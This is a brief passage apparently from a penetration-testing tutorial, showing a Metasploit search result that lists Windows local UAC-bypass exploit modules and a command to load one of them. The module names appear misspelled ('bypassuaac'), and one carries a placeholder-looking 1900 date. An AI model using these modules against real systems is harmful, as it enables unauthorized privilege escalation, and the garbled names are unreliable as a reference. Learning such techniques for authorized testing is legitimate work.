    ```


    Matching Modules


    | Name | Disclosure |

    |---|---|

    | exploit/windows/local/bypassuaac | 2010-12-31 |

    | exploit/windows/local/bypassuaac_comhijack | 1900-01-01 |

    | exploit/windows/local/bypassuaac_eventvr | 2016-08-15 |

    | exploit/windows/local/bypassuaac_fodhelper | 2017-05-12 |

    | exploit/windows/local/bypassuaac_injection | 2010-12-31 |


    Let''s try the "bypassuaac_injection" module.


    Enter the following:


    ```

    use exploit/windows/local/bypassuaac_injection

